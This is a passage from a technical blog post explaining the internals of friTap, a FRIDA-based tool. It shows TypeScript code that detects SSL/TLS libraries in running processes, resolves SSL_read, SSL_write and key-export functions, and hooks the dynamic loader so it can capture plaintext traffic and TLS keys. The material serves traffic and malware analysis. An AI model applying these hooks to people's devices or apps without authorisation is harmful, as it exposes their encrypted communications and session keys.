&lt;p>Then an os specific agent will be loaded. This agent enumerates all loaded libraries/modules from the target process. FRIDA provides a function for this purpose that returns for each loaded module its name, base address, size and path in the file system. Based on the name of the modules friTap can identify a SSL/TLS library. Depending on the version and operating system, the name of the loaded module can vary greatly. friTap tries to cover all potential module names of supported libraries as best as possible using expressive regex. The operating system-specific agent determines which libraries are supported and how its hooking is implemented:&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2022/08/fritap_hook.svg" alt="">&lt;/p>
&lt;p>When a supported library is detected, friTap tries to hook the &lt;code>SSL-read()&lt;/code>, &lt;code>SSL-write()&lt;/code> and &lt;code>SSL-keyexport()&lt;/code> functions of the respective library and all other functions required for this. Sometimes the target library doesn&amp;rsquo;t provide a key export function, in those cases friTap have to parse the heap in order to find the keys in the memory of the target process.&lt;/p>
&lt;p>Next we want to dive into the implementation details of the mentioned parts of friTap. As mentioned above friTap checks at first on which plattform our target process is running and invoke than its respective os specific agent:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">load_os_specific_agent&lt;/span>() {
&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isWindows&lt;/span>()){
&lt;span style="color:#a6e22e">load_windows_hooking_agent&lt;/span>()
}&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isAndroid&lt;/span>()){
&lt;span style="color:#a6e22e">load_android_hooking_agent&lt;/span>()
}&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isLinux&lt;/span>()){
&lt;span style="color:#a6e22e">load_linux_hooking_agent&lt;/span>()
}&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isiOS&lt;/span>()){
&lt;span style="color:#a6e22e">load_ios_hooking_agent&lt;/span>()
}&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isMacOS&lt;/span>()){
&lt;span style="color:#a6e22e">load_macos_hooking_agent&lt;/span>()
}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Error: not supported plattform!\nIf you want to have support for this plattform please make an issue at our github page.&amp;#34;&lt;/span>)
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This agent installs the hooks for the detected libraries. First the enumerations of the supported SSL/TLS libaries are safed (&lt;code>module_library_mapping&lt;/code>) and provided for the different hooks. In the following we see how this is done for Android:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#66d9ef">export&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">load_android_hooking_agent&lt;/span>() {
&lt;span style="color:#a6e22e">module_library_mapping&lt;/span>[&lt;span style="color:#a6e22e">plattform_name&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> [[&lt;span style="color:#e6db74">/.*libssl_sb.so/&lt;/span>, &lt;span style="color:#a6e22e">boring_execute&lt;/span>],[&lt;span style="color:#e6db74">/.*libssl\.so/&lt;/span>, &lt;span style="color:#a6e22e">boring_execute&lt;/span>],[&lt;span style="color:#e6db74">/.*libgnutls\.so/&lt;/span>, &lt;span style="color:#a6e22e">gnutls_execute&lt;/span>],[&lt;span style="color:#e6db74">/.*libwolfssl\.so/&lt;/span>, &lt;span style="color:#a6e22e">wolfssl_execute&lt;/span>],[&lt;span style="color:#e6db74">/.*libnspr[0-9]?\.so/&lt;/span>,&lt;span style="color:#a6e22e">nss_execute&lt;/span>], [&lt;span style="color:#e6db74">/libmbedtls\.so.*/&lt;/span>, &lt;span style="color:#a6e22e">mbedTLS_execute&lt;/span>]];
&lt;span style="color:#a6e22e">install_java_hooks&lt;/span>();
&lt;span style="color:#a6e22e">hook_native_Android_SSL_Libs&lt;/span>(&lt;span style="color:#a6e22e">module_library_mapping&lt;/span>);
&lt;span style="color:#a6e22e">hook_Android_Dynamic_Loader&lt;/span>(&lt;span style="color:#a6e22e">module_library_mapping&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>If supported, friTap installs java based hooks. Right now these java hooks only installed for Android applications. Next the plattform (operating system) specific hooks are installed. After a supported SSL/TLS library has been found, the search for the corresponding functions (read, write, key export) inside the module is started. This is done using the mapped functions from &lt;code>module_library_mapping&lt;/code>. When we have a closer look into the enumerations we can see that for each detected library an appropriate so called &lt;code>&amp;lt;libname&amp;gt;-execute&lt;/code> function is mapped. This mapped function contains the implementation details of the &lt;code>SSL-read()&lt;/code>, &lt;code>SSL-write()&lt;/code> and &lt;code>SSL-keyexport()&lt;/code> hooks. Strictly speaking, for each identified library, its platform-specific hook (read, write, export) is installed for the corresponding library. Fortunately, the majority of hooking implementations are platform independent, with only a few platforms having differences. This means that the overall hooking implementation for a specific library is provided by an os independent super class. In the following we see the Android OpenSSL hooking implementation with the implementations inherited from its superclass:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#75715e">/* from openssl_boringssl_android.ts */&lt;/span>
&lt;span style="color:#66d9ef">export&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">OpenSSL_BoringSSL_Android&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> &lt;span style="color:#a6e22e">OpenSSL_BoringSSL&lt;/span> {
&lt;span style="color:#a6e22e">constructor&lt;/span>(&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">moduleName&lt;/span>&lt;span style="color:#f92672">:&lt;/span>String, &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">socket_library&lt;/span>&lt;span style="color:#f92672">:&lt;/span>String){
&lt;span style="color:#66d9ef">super&lt;/span>(&lt;span style="color:#a6e22e">moduleName&lt;/span>,&lt;span style="color:#a6e22e">socket_library&lt;/span>);
}
&lt;span style="color:#a6e22e">execute_hooks&lt;/span>(){
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">install_plaintext_read_hook&lt;/span>();
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">install_plaintext_write_hook&lt;/span>();
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">install_tls_keys_callback_hook&lt;/span>();
}
}
&lt;span style="color:#66d9ef">export&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">boring_execute&lt;/span>(&lt;span style="color:#a6e22e">moduleName&lt;/span>&lt;span style="color:#f92672">:&lt;/span>String){
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">boring_ssl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">OpenSSL_BoringSSL_Android&lt;/span>(&lt;span style="color:#a6e22e">moduleName&lt;/span>,&lt;span style="color:#a6e22e">socket_library&lt;/span>);
&lt;span style="color:#a6e22e">boring_ssl&lt;/span>.&lt;span style="color:#a6e22e">execute_hooks&lt;/span>();
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The specific functions of the library are only then hooked in the superclass. This is done by library&amp;rsquo;s specific function names (SSL_read, SSL_write&amp;hellip;) which are passed to our &lt;code>readAddresses()&lt;/code> function in order to obtain the addresses for hooking.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#75715e">/* super class openssl_boringssl.ts */&lt;/span>
&lt;span style="color:#66d9ef">export&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">OpenSSL_BoringSSL&lt;/span> {
&lt;span style="color:#75715e">// global variables
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">library_method_mapping&lt;/span>&lt;span style="color:#f92672">:&lt;/span> { [&lt;span style="color:#a6e22e">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span>]&lt;span style="color:#f92672">:&lt;/span> Array&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">&amp;gt;&lt;/span> } &lt;span style="color:#f92672">=&lt;/span> {};
&lt;span style="color:#a6e22e">addresses&lt;/span>&lt;span style="color:#f92672">:&lt;/span> { [&lt;span style="color:#a6e22e">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span>]&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">NativePointer&lt;/span> };
...
&lt;span style="color:#a6e22e">constructor&lt;/span>(&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">moduleName&lt;/span>&lt;span style="color:#f92672">:&lt;/span>String, &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">socket_library&lt;/span>&lt;span style="color:#f92672">:&lt;/span>String,&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">passed_library_method_mapping&lt;/span>&lt;span style="color:#f92672">?:&lt;/span> { [&lt;span style="color:#a6e22e">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span>]&lt;span style="color:#f92672">:&lt;/span> Array&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">&amp;gt;&lt;/span> }){
&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#66d9ef">typeof&lt;/span> &lt;span style="color:#a6e22e">passed_library_method_mapping&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;undefined&amp;#39;&lt;/span>){
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">library_method_mapping&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">passed_library_method_mapping&lt;/span>;
}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">library_method_mapping&lt;/span>[&lt;span style="color:#e6db74">`*&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>&lt;span style="color:#a6e22e">moduleName&lt;/span>&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">*`&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#34;SSL_read&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;SSL_write&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;SSL_get_fd&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;SSL_get_session&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;SSL_SESSION_get_id&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;SSL_new&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;SSL_CTX_set_keylog_callback&amp;#34;&lt;/span>]
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">library_method_mapping&lt;/span>[&lt;span style="color:#e6db74">`*&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>&lt;span style="color:#a6e22e">socket_library&lt;/span>&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">*`&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#34;getpeername&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;getsockname&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;ntohs&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;ntohl&amp;#34;&lt;/span>]
}
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">addresses&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">readAddresses&lt;/span>(&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">library_method_mapping&lt;/span>);
...
}
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>FRIDA provides with the &lt;a href="https://frida.re/docs/javascript-api/#apiresolver">ApiResolver&lt;/a> a function &lt;code>enumerateMatches(&amp;quot;exports:&amp;quot; + library_name + &amp;quot;!&amp;quot; + method)&lt;/code>:
This is passed the name of the function, the name of the module and the type (export, import) in a single string. If a match is found, information about this function is returned, of which friTap only needs and stores the address. Below is the whole listing of friTap&amp;rsquo;s &lt;code>readAddresses()&lt;/code> function:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#75715e">//File: agent/shared/shared_functions.ts
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e">* Read the addresses for the given methods from the given modules
&lt;/span>&lt;span style="color:#75715e">* @param {{[key: string]: Array&amp;lt;String&amp;gt; }} library_method_mapping A string indexed list of arrays, mapping modules to methods
&lt;/span>&lt;span style="color:#75715e">* @return {{[key: string]: NativePointer }} A string indexed list of NativePointers, which point to the respective methods
&lt;/span>&lt;span style="color:#75715e">*/&lt;/span>
&lt;span style="color:#66d9ef">export&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">readAddresses&lt;/span>(&lt;span style="color:#a6e22e">library_method_mapping&lt;/span>&lt;span style="color:#f92672">:&lt;/span> { [&lt;span style="color:#a6e22e">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span>]&lt;span style="color:#f92672">:&lt;/span> Array&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">&amp;gt;&lt;/span> })&lt;span style="color:#f92672">:&lt;/span> { [&lt;span style="color:#a6e22e">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span>]&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">NativePointer&lt;/span> } {
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">resolver&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">ApiResolver&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;module&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">addresses&lt;/span>&lt;span style="color:#f92672">:&lt;/span> { [&lt;span style="color:#a6e22e">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span>]&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">NativePointer&lt;/span> } &lt;span style="color:#f92672">=&lt;/span> {}
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">library_name&lt;/span> &lt;span style="color:#66d9ef">in&lt;/span> &lt;span style="color:#a6e22e">library_method_mapping&lt;/span>) {
&lt;span style="color:#a6e22e">library_method_mapping&lt;/span>[&lt;span style="color:#a6e22e">library_name&lt;/span>].&lt;span style="color:#a6e22e">forEach&lt;/span>(&lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">method&lt;/span>) {
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">matches&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">resolver&lt;/span>.&lt;span style="color:#a6e22e">enumerateMatches&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;exports:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">library_name&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;!&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">method&lt;/span>)
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">match_number&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">method_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">method&lt;/span>.&lt;span style="color:#a6e22e">toString&lt;/span>();
&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">method_name&lt;/span>.&lt;span style="color:#a6e22e">endsWith&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;*&amp;#34;&lt;/span>)){
&lt;span style="color:#a6e22e">method_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">method_name&lt;/span>.&lt;span style="color:#a6e22e">substring&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#a6e22e">method_name&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>)
}
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">matches&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Could not find &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">library_name&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;!&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">method&lt;/span>
}
&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">matches&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>){
&lt;span style="color:#a6e22e">devlog&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Found &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">method&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">matches&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>].&lt;span style="color:#a6e22e">address&lt;/span>)
}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">k&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#a6e22e">k&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">matches&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span>; &lt;span style="color:#a6e22e">k&lt;/span>&lt;span style="color:#f92672">++&lt;/span>) {
&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">matches&lt;/span>[&lt;span style="color:#a6e22e">k&lt;/span>].&lt;span style="color:#a6e22e">name&lt;/span>.&lt;span style="color:#a6e22e">endsWith&lt;/span>(&lt;span style="color:#a6e22e">method_name&lt;/span>)){
&lt;span style="color:#a6e22e">match_number&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">k&lt;/span>;
&lt;span style="color:#a6e22e">devlog&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Found &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">method&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">matches&lt;/span>[&lt;span style="color:#a6e22e">match_number&lt;/span>].&lt;span style="color:#a6e22e">address&lt;/span>)
&lt;span style="color:#66d9ef">break&lt;/span>;
}
}
}
&lt;span style="color:#a6e22e">addresses&lt;/span>[&lt;span style="color:#a6e22e">method_name&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">matches&lt;/span>[&lt;span style="color:#a6e22e">match_number&lt;/span>].&lt;span style="color:#a6e22e">address&lt;/span>;
})
}
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">addresses&lt;/span>
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After all relevant function addresses are available, friTap finally installs the hooks when entering or leaving the respective functions. More on this later.&lt;/p>
&lt;p>It is possible that a program to be analyzed does not load an SSL/TLS library at program start or loads an SSL/TLS library again at another time. For this case friTap hooks a function in the respective standard library of the operating system. The following is the implementation for Android:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#75715e">/* File agent/android/android_agent.ts */&lt;/span>
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">hook_Android_Dynamic_Loader&lt;/span>(&lt;span style="color:#a6e22e">module_library_mapping&lt;/span>&lt;span style="color:#f92672">:&lt;/span> { [&lt;span style="color:#a6e22e">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span>]&lt;span style="color:#f92672">:&lt;/span> Array&lt;span style="color:#f92672">&amp;lt;&lt;/span>[&lt;span style="color:#a6e22e">any&lt;/span>, (&lt;span style="color:#a6e22e">moduleName&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span>)=&amp;gt;&lt;span style="color:#66d9ef">void&lt;/span>]&lt;span style="color:#f92672">&amp;gt;&lt;/span> })&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span>{
...
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">regex_libdl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">/.*libdl.*\.so/&lt;/span>
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">libdl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">moduleNames&lt;/span>.&lt;span style="color:#a6e22e">find&lt;/span>(&lt;span style="color:#a6e22e">element&lt;/span> =&amp;gt; &lt;span style="color:#a6e22e">element&lt;/span>.&lt;span style="color:#a6e22e">match&lt;/span>(&lt;span style="color:#a6e22e">regex_libdl&lt;/span>))
...
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">dl_exports&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Process&lt;/span>.&lt;span style="color:#a6e22e">getModuleByName&lt;/span>(&lt;span style="color:#a6e22e">libdl&lt;/span>).&lt;span style="color:#a6e22e">enumerateExports&lt;/span>()
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">dlopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;dlopen&amp;#34;&lt;/span>
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">ex&lt;/span> &lt;span style="color:#66d9ef">of&lt;/span> &lt;span style="color:#a6e22e">dl_exports&lt;/span>) {
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">ex&lt;/span>.&lt;span style="color:#a6e22e">name&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#e6db74">&amp;#34;android_dlopen_ext&amp;#34;&lt;/span>) {
&lt;span style="color:#a6e22e">dlopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;android_dlopen_ext&amp;#34;&lt;/span>
&lt;span style="color:#66d9ef">break&lt;/span>
}
}
&lt;span style="color:#a6e22e">Interceptor&lt;/span>.&lt;span style="color:#a6e22e">attach&lt;/span>(&lt;span style="color:#a6e22e">Module&lt;/span>.&lt;span style="color:#a6e22e">getExportByName&lt;/span>(&lt;span style="color:#a6e22e">libdl&lt;/span>, &lt;span style="color:#a6e22e">dlopen&lt;/span>), {
&lt;span style="color:#a6e22e">onEnter&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">args&lt;/span>) {
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">moduleName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>].&lt;span style="color:#a6e22e">readCString&lt;/span>()
},
&lt;span style="color:#a6e22e">onLeave&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">retval&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">any&lt;/span>) {
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">moduleName&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">undefined&lt;/span>) {
&lt;span style="color:#66d9ef">for&lt;/span>(&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">map&lt;/span> &lt;span style="color:#66d9ef">of&lt;/span> &lt;span style="color:#a6e22e">module_library_mapping&lt;/span>[&lt;span style="color:#a6e22e">plattform_name&lt;/span>]){
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">regex&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">map&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">func&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">map&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">regex&lt;/span>.&lt;span style="color:#a6e22e">test&lt;/span>(&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">moduleName&lt;/span>)){
&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">`&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">moduleName&lt;/span>&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> was loaded &amp;amp; will be hooked on Android!`&lt;/span>)
&lt;span style="color:#a6e22e">func&lt;/span>(&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">moduleName&lt;/span>)
}
}
}
}
})
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">`[*] Android dynamic loader hooked.`&lt;/span>)
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now all functions for extracting the streams or the key material should have been identified so that friTap can use the hooks for extracting the plaintext payload or the TLS keys.&lt;/p>
&lt;p>Lets dive into the hooking implementations itself. The way of instrumentation varies partly between the different supported libraries and plattform, but all follow the same principle.&lt;/p>
&lt;h3 id="hooking-the-read-function">Hooking the read function&lt;/h3>
&lt;p>The read functions of the libraries generally have function signature of the following structure:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">read&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>, &lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>, &lt;span style="color:#66d9ef">int&lt;/span>)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The first parameter is a pointer to an SSL object that holds all information about the SSL session in use in the background. This object is used to identify the SSL/TLS stream over which data is received. The second parameter is a pointer to a temporary buffer that holds unencrypted data received from the SSL/TLS stream. The third parameter is the maximum number of bytes that can be stored in the buffer for data received from the SSL/TLS stream.&lt;/p>
